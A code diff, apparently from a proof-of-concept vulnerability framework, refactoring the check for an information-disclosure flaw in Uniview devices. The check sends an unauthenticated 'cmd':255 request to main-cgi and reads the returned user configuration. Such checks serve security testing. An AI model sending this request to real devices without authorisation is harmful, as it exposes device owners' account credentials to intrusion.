@@ -44,10 +44,11 @@ class UniviewDisclosure(POCTemplate):
         """
 
     def verify(self, ip, port=80):
-        headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
-        url = f"http://{ip}:{port}" + '/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}"'
+        headers = self._get_headers()
+        proxies = self._get_proxies()
+        url = self._get_url(ip, port, '/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}"')
         try:
-            r = requests.get(url, headers=headers, verify=False, timeout=self.config.timeout)
+            r = requests.get(url, headers=headers, verify=False, timeout=self.config.timeout, proxies=proxies)
             if r.status_code == 200 and r.text:
                 tree = ElementTree.fromstring(r.text)
                 items = tree.find('UserCfg')
